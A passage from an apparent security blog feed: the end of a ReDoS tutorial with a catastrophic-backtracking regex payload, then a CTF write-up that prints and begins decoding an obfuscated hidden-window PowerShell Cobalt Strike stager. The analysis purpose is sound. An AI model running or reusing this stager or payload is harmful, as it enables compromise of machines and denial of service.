class="hljs-number">1.1</span><br><span class="hljs-symbol">Host:</span> [host]<br>...<br><br><span class="hljs-attr">nickname</span><span class="hljs-operator">=</span>xxx<span class="hljs-variable">&amp;password</span>=xxx&amp;...<br></code></pre></td></tr></table></figure><p>当<code>password</code>中包含<code>nickname</code>则提示<strong>密码中不能包含用户名</strong></p><p>利用Python简单还原一下后端逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> sys,re<br>username = sys.argv[<span class="hljs-number">1</span>]<br>password = sys.argv[<span class="hljs-number">2</span>]<br><br>regex = re.<span class="hljs-built_in">compile</span>(username)<br><span class="hljs-keyword">if</span> (regex.<span class="hljs-keyword">match</span>(password)):<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;密码中不能包含用户名&#x27;</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;用户添加成功&#x27;</span><br></code></pre></td></tr></table></figure><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15912570317566.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15912570317566.jpg" alt></a></p><p>这时候用户名是一个正则，密码是一个待匹配字符串，而这时候我们都可以进行控制，也就能构建恶意的正则的表达式和字符串进行ReDoS攻击。</p><p>恶意的正则表达式：<code>a(b|c+)+d</code> 字符串（我们要想让其陷入回溯模式就不能让其匹配到，所以使用<code>ac......cx</code>的格式即可）：<code>acccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccx</code></p><p>如下图所示ReDoS攻击成功：</p><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15912572931314.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15912572931314.jpg" alt></a></p><p>我们只需要以同样的方式替换原请求包中的参数值即可（<strong>前提是该功能没有限制字符串长度和特殊字符</strong>）</p><h2 id="0x03-参考">0x03 参考</h2><p><a href="https://gh0st.cn//archives/2020-06-22/1">https://gh0st.cn//archives/2020-06-22/1</a></p><p><a href="https://www.yuque.com/waiting4/taa5c4/ub51tc">https://www.yuque.com/waiting4/taa5c4/ub51tc</a></p><p><a href="https://bbs.pediy.com/thread-252487.htm">https://bbs.pediy.com/thread-252487.htm</a></p><p><a href="https://www.checkmarx.com/wp-content/uploads/2015/03/ReDoS-Attacks.pdf">https://www.checkmarx.com/wp-content/uploads/2015/03/ReDoS-Attacks.pdf</a></p><p><a href="https://zhuanlan.zhihu.com/p/41800341">https://zhuanlan.zhihu.com/p/41800341</a></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一道Powershell代码混淆的CTF题</title>
    <link href="/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/"/>
    <url>/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-题目">0x01 题目</h2><p>**题目：**蓝军捕获了以下代码，要求解出CS连接的服务器地址和端口！</p><p><em>注：代码很长，直接复制到本地再看</em></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">%COMSPEC% /b /c <span class="hljs-built_in">start</span> /b /min powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-encodedcommand</span> JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWAA2ADMATwBpAFMAaABiAC8ASABQADgASwBQAHEAUgBLAEwAVQAyAEMAagA1AGcANABXADEATgAxAFYAVQBCAFEAUQBCAFQAZgB1AGEAawBVAGoAeABaAFIAbwBIAGsAMABLAE4ANgBaAC8ALwAwAGUAVQBIAE0AegBPADUAbgBkAHEAZABxADEAaQByAEsANwBPAGMALwBmAGUAZgBSAEIAUgBlAFIATwBKAGEARgB0AEUAQQBtAGIAaQBMAHEAYgBvAHoAQwB5AHMAVQBmAFYAQwA0AFYAYgBCAGcAdQBFACsAawByADkAVQBTAHgAcwBZAHMAOABnADIAWABHADIAZQBMAE0AUQBlAGYATgBEAGIATAB4AHAAcABoAG0AaQBLAEsATAArAEsAdAB3AG8AVwBxAGkANQBWAE8AawAyADAAYwBJADMARgA1AHUAeABnADYAcABVAHYAcwBrAEkAawBSAG0ASABxAEgAeAB6AFUANwBqAEoAagAyAEkAdgAwAGoAYgBvAHoAZABPAEkAbgBhAEEAMwBGADUARQB0AE4AaQBOAFEAVgBIAHIAcAArAEQANgBEAFgAYwAzADIAWAByADkAOAA2AGMAVgBoAGkARAB4AHkAMwB0AC8AMwBFAGUAbABFAEUAWABKADEAeAAwAFoAUgBxAFUAeAA5AG8AeABaAGIARgBLAEsANwBrAGIANQBEAEIAcQBIACsAbwBtADcAZgA3AHYAcwBPADEAagBYAG4AUQBwAGIAMgBOAEcATQBMAEQAbgBVADgATQAzAHMAbgBZAGsAUABMAFAATABoAFgAZgBjAGMAbQBwAGUASwBmAGYAeABiAEwATAAzAGUAMQAxADMAcwAyAGkARABVAG4ASwBoAFgAVgBOAEMATABJAHYAVABjAGQAcAAxAGkAbQB2AHAAYwB6AGgAZABQAFUAUgA2AFcAaQBaAEIAcwBoAGoAdgBDAEcAMwBDADkAcwByADEARwAvAG4AKwBYAFcAeQA3AG4AeAAwAHQAbgAyAFkAdgBuAGkAbQBlAFYAcgA0AE0AZQB2AG4AYwB5AGsAbgBuAGwASwBSAFYAZwBxAGcARQAzAG4AagBHAEcAeABTAHIAMQBrACsAbAA1AGUAWAA2AGsALwAzAHEAMgBaAHgAQgA2AHgAWABYAFEAdgBlAEEAUwBGADIARgBkAFIAbQBOAGcARwBpAHUANQA1AHoAVABNAGQATgBFAEUAYgBZAEMAdABHAEUARAA3AFAASwBwAGIAQgBpAEIAQwBSAE8AUABTAG8AcQB5ADMAQQBsACsAQQA5AEsAdAAxADYAcwBlAE4AVQBRAGUANwBMADcAOABwADkATABjAG4AbwBjAEEAWAAzAGQANQBsAEsASAA1AG0AQQBTAGkARgBoAHUAWAByAEoAaQBkACsAQgBRADgAcgB6ADUAaQB3AE8AMwBQAG4ASgArAGcALwBKAFYAWQBiAGYAVAB3AGwAVwBMAG4AdwB2AGYASgBLAHEASgBuAEsAUQBwAFIASAAwAFIAZwBEAGYARAA3AGwAYQB1AEwAbAA1AHkAWgBjAEkALwBDAGsAcABPAEwASgB6AHYAcQA4AFUAWABhAFUAawBNAEUASQBqAE8ARQB5AHoAYwBFADcARABHAEoAVgBmAC8ANABuAFAAVwBlADIAVgBNADYAcgArAFUAbABEAHQAeQBuAFgAaABPAFkAZgBuAGIATQBkAFgANgBtAFcATwBiAGYATwAxAGMARgBNAHUAWABMAEkAbgBPADMALwBUAFkAOQBzAHgAVQBaAGkAOQAvADMAVQAxAE0ARwBoAGoAZQA0AGgASgBQAGMAMgAxAGoAVwB2AEMAbAB6ADYATABHAGQAbwA0AEsATQBmAGoALwBrAG8AbQBnADUAMgBsADQAdQBVAEYATQBwAGsATABPAHMAVQBNADAASgBlAGYAMgBWAGoAWABKAHUAKwA4ADMAYgBOAHgASABRAFAAaQBIAG8ARgBWAGsAQgBMAGwASAA0ADAANQB4ADcAQgBVAEYARAB3AEoAdQBZAEQAZgBlAFEAOQBwAGUAcgB1AEIATQBrAE4AWAA2AGsAdABwAHAAVgBmAHQAMgBUADcATAA1AFoANgBqAFIAVgBHAFYAVQBtAEsAbwBjADYATgBLAHEAVQBoAHoAawBGAG0AbABPAGwANQBrAFgAMQA1ADEAWQBvAEwAegBaAGYARQBmAGMANgBYAFkASQBiAGEAaABSAGUAUQBxADcAcgBYADgAQwBhAFEAWAAxAFQAMwBzAFEAYwBYAEUAQgBrAFEAWABZAEoAaQBxAFAAagBKAHMAegBjAGwAUQBxAFYASwA4AGIAYQBKAHUAcQB0AHIAVwAxAFkAVABpAHAANQBqADAATgBNAGUAQgBrAGcATgBKAEMAYwBRAEUAVABqAEkAcwBWAEoATABsAFQARwBoAFcALwB6ADAALwB5AHYAYwBxAEkAbwBMAHIATwA4AGcARgA2AHIAdwBMAGMAWQA1AG0AUQBjACsANQBWAEYAUwBlAGIAcABxAEYAegBPAEoALwBNAFAAdABhAEoAKwBlAGkAeQBMAEMANgBnAHYAVABCAGEARQBnAEEAMQBjAEcAawBTAHMAMwB0AGsARQBCAGYASwAxAFoALwBTAHIAegAvAHoAYgB3AGYAVwA4AHcAUABaAHYAWgBDAGQAQQBsAGsASwBTAC8ARQBsADIANQBLAHMAbgBMAEoASwBZADMAcwBjAHYAbgA2AGoAbQBXAE8AWABFAGcAQQBOAFMANwBFAGIAbABlAEwAVQBLAHUAcAA1AG0AMgBzAFYARwB3ADgAeAA0AEcAUQBTAHIAdAB4AEsAKwB5AHoAQwBjAGMASABQAEQAdQBGAEoANABHAG4ARQBYAEMAcwBLAEEANABtAGYAbgBjAGkARwBtAHcAOABVAG4AaAA2AHMAQgBIAEcAegAwAHcAegBQAHMAUgBDAFAATwAzAFMARABZADQARwB1AGwAUABRAFoAegBkAEMATQBzAEsAcgBXAHUAdwAyAGEANgBZAHYASgBEAEsAYwBSAFUAOABCAEgAegBGAEMAdwBuAFQANABlAG8AQwA1AGwAbQBXADMATAAzAEwATwAvAEcAUAA5AFUATgBPAFgAQQB2AGUAawA5ADcAawBtAFAANAArADQAagBKADQAWABrAGkANABYADkATgBvAFkAMQBnADkAQwAwAHMATQBEADQASAB0AHUAKwBWADcAMwBZAEQAWQBSAE8AMgBpAGgAcABXAGcAYwBHAHUAUQBaAGEAZABZAHgASABjADQAcgBLAGwAMwByAHoAMQBOAFoAbgBMAE8AKwByAEgAcQBtAHEATgBmAEcAMwBFAEEAKwAxAFYAUAB3AEMAZgB4AFMARwAvAHkARQBOAHUARgBSAGoAMAA1AHQAZwBhAGQARwBPAHcAcgA0AHoARgAvAFUARgBRAFAARABHAHcAdwBFAGYAcABDAHEAagA1AFkAdABwAFAATABCAG8AQQBrAGQAaABDAGUAbgBvAGEAeABQAGEAZgBBAE0ALwBIAEkAVABNAEQAbQBxAHEAVABSAHAAdABzAHkAagBzAGUAUQBPAHgAbABJAFcAVQAzADQAbAA5ADAARgBIAEUAQwArAHMASgBpACsATAArAE4AagBaAEMAYQAyAFEAVQBWAFgAegBwAEUANgBQAE4AYgBXADIAZABoAEoAdABhAGIAUwA5AFEANgA1AGYATgBZADgASABjAHgAYQBOAEIAbABPAHkAYQBpAGkAYQAyADAAeABUAHIANgBVAEsATwArAEUAbwBHAGoANgBaAEwAdwBlAHQAVQBFAHQANwB2AG0AZwBqAHYAYgBzAGgAbQBkAHkAQgB1AEwAWQBHAGIAUgBiAFcATABEAG4AUwBxAGoAcABKAFQAZABEAHIAOABGAE4AbQBDAEgAcQA5AG4AaQBTAEIARAA5AG8AagB0ADkAcQBqAGgAagBKAGMAeQBDAGUAagAwAFIAVwBOAE4AQgBUAEEARAAyAFgAWQBzAGsASAAyAE0ANQBFAGEAYwBNADcAMAAxADQAOABtAE8AOQB1AHAANwBBAEcAYgBnAHMAWABpAHcAWABCAHAAdABaAGEAUAB3AFUAbgBoAG4AWgBvADkAcQB1AGwAeAB2AHoASwBQAGUANgAyAFEAKwBCADcAbQBtADcAWABBAHEAbABmAEEATwBkAFAAdgAxAEsAZgBtAGIASQBrAGQAdgBrAEkARwBEACsANQBzADEASAByAFUAMAAvAGoAQgBQAEQANwBJAHcAQgAwAFIAMQBuAG0AbwBLAGEANgAvAFEATAA0AHoAbwBqAGQAcwBxAE0AcgAxAEcAYgB1AGUATQBPADYAQQBuAGUAeAByAHkALwA1AFkAagBxAGUAYwBNADUAegBTADcAUgA3AFQAWABjAG4AcwBRAFIATABIADcASABFADAAbwB3AGQATABkAGMAOABwAGsANgAzAEYANgBGADQAMwBXAEYAdQBTAHgAawB5AGsAVgBhAGMAeABHAFUANQBuAHAAagBUAG4ATwBvAHkAKwBOAEIAaAB1AFQASwB2ADkAagB0AHkAWQB6AFgAdwArAGsANQBmAEwATwBGAHIATQBhAG4ARQBNADEAbAB1ADgATQBoAHIAbQAxAGgAagBqAGUASwBnAHEAegBiAGsAZgBjACsAcgB3AGEAUwBLADEAVgBpAHYATQBMAHEAeABIAFcAVwBtAHAANwBUADAAegBTAFoAKwBTAFcAcQBYAHQAdABKAGEASgB0AGwAbgB2ACsAOAA5AE4ATABuAEEAbgBzAFQAbQBXAEoAVgA2AGUASQAxAFoAcQBMAHgAUgBtAEYAaQByADkAVQA1AGUAdgBrAC8AWABhAGwALwBaAGEANQBMAFcAUwBQAGgAdgA0AHMAagArAGIANwBlAHkAdABQAGYAYgAyAGsASABnADQARwBUAHoATwBEAHIASwA4ADYASgBLAGwAdQBlAGgAdQBCADAAKwBDAEsAZwA3AFgAUQBhAHQAegBXAE0AbQA0AFYAMgBIAG8AcgBiADcAcgBIAHAALwBkADkASQBqAEcAegBsAE8AMABhADIAKwBSAEkAZABhAEcAKwAwAEUAOABxADcAdAA2AHgAVwBHADIAeQB0AEsAYQBWADgAWQBLAHIANgBkAHkAZQByAFEAVwBkAGIARgBqADkAcABkAEQAcQBiAC8AcgBIAEMAYgBNAFkATQBOAEgALwBuAFQAagB1AHkAZAA5AHUAdABuADUAZgBXADAAZABJAG8ANQBPAFAARwAvAGsASwByAE8AdwBWAHgAbgBqAFYAUwBCAEwAYwB6AEoAegA5AG4AaAB5AGUAbABEAFcAagBqAEoAZAByAEMAdQAxAGoAYQBpADIAUgBpAEcAeQBWAGwATwB6AGYAdwBwAFkATABuAEUATgBsAHIARAAxADUASQBpAE0AcAAyAEIATABGAHMASgBPAGIAWQA4AFcAMQBoAEoAeQBjAGUALwBzAEkASQA5AFAAawBOAE0AaQBQAEQAdQBoAE0AUgBGAFIAMAB6AHcAYwBJAGMAZQBpAEEAYwA1AHEAWgBTAGMAawBmAG0AbwBNAFEAOQBaAGsAbwAxADAASAA5AGcAWQAvAEYAeQBWADkARQBSAHoATQBVADkAMgBQAEkAZQB5AGEAdABSAGYAaQBIAHQAUwA0ADMAawBjAFYAUgBnAHoASQBFACsAUwBkAHMATwB4AGIAOQBLAFIALwBvAEgAWABXAGcAcABqAFoAZQBkADEAWgBXAGYAZgBhADQAQgBEAG0AawBXAE4AMgB4AC8AKwBMAGcAdgA4ADcAaAAxAEQAdgAvAFEAbQA2AEUAagBTADgANwBMAHgAUwBLAFcAZAB6AHcAdgB1AGIAbAA5AHYAagA2ADMAVwB1AGUAOQAvAGYANgBVAGUAUQAxAG4AagBNAGUAbAAzACsASgB0AEUAKwBkAEwAaABmAEQAVQB1AFMARgBrAFoAYgB6AFkASABPAEIAdwBQAFAAOQBiAHIAaQBjAE0AaABkAHgAaABZAEYAMgB4AGwASABxAGYAVAA1AHAATAAxAEgAbwBZAGMAYwBtAEUASgBoAFQAcgAwADIAKwBZADcAagBZAEMATQBiAHQASAA0AHgAOABjAEQAWQBkAHgANwBHAFgAdQBFAHkAbQA4AEcAeQBVAGYAOQAwAFYAYQBiAGUAQwBXAEcANgBPAHYAdQBrAHgANQB0AE4AUABvAHgAYwBQAEwAegBPAFoARgBmAEMATAAxAC8AVwA0AEYANwAxAEEANABnAGkAOABpAHkAeQByAFYATAAwAHMAVQBIAFQAZABQAGIAZgBwAE0AdQBGADMANABlAGwAaAAvADIAMAA5AEMANgB1AG0AZwAxAGoASAB5AHoANQBxAE0AbgBKAE4AWgBVAHYANgBJAGUAeAA1ADYATAAvAFkAdwBCACsAVQBQAHIAZgBvAGMAMwBBAHkAKwBlADUAZAArAGgAeQBnAHoANwBIAHEAMQB3AG8ALwBsAEUAbwBDAEIAdgBxAHcAMwBsAGsAbgArAEIAcgBCAFEAWABVAGMANQA1ADcARQBkAEYAQwBjAHIAZgBEAE8AbgB6AGEANQBIAGQAMQA2AFYAWQByAFUAdwBLADcAcABHADQAMQA2AGoAdAAxAEIAKwA1ADEAbwBrAFkAZAB2AG0AOQBDAEsAOAA0AHUAYgB1AHIAOAB1AGYAYQBOAE8AbQBqADIAbQBmAEUAYgBOAFUARQBHAGcAbgBIADcAYgBvAEIAMQB5AEYASQBFADgAMQBjAG0ATwBoAGUAUwBFAGMAUABaADMANABXAEQAVwBDAGoALwBEAFEAQQBBACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA<br></code></pre></td></tr></table></figure><h2 id="0x02-过程">0x02 过程</h2><p>后面的密文盲猜一个base64，用网上的解密工具试了一下有空格，干脆在Kali里面去搞。</p><p>粘贴密文保存成secret文件，方便在命令行base64解密。</p><h3 id="第一次解密">第一次解密</h3><p>第一次base64解密后结果为：</p><p><img src="/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506114133488.png" alt="第一次解密"></p><p>发现里面又有base64密文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs base64">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<br></code></pre></td></tr></table></figure><p>密文带有斜杠，解密八成是乱码：</p><p><img src="/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506114427053.png" alt="第二次解密"></p><h3 id="第二次解密">第二次解密</h3><p>这时候仔细观察第一次解密后的密文，发现在密文最后有<code>IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();</code></p><p>其中<code>GzipStream</code>是重点，说明密文采用了Gzip压缩。这时候只需要解压缩就可以了。</p><p>执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;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&quot;</span> | <span class="hljs-built_in">base64</span> -d | gunzip<br></code></pre></td></tr></table></figure><p>得到明文：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 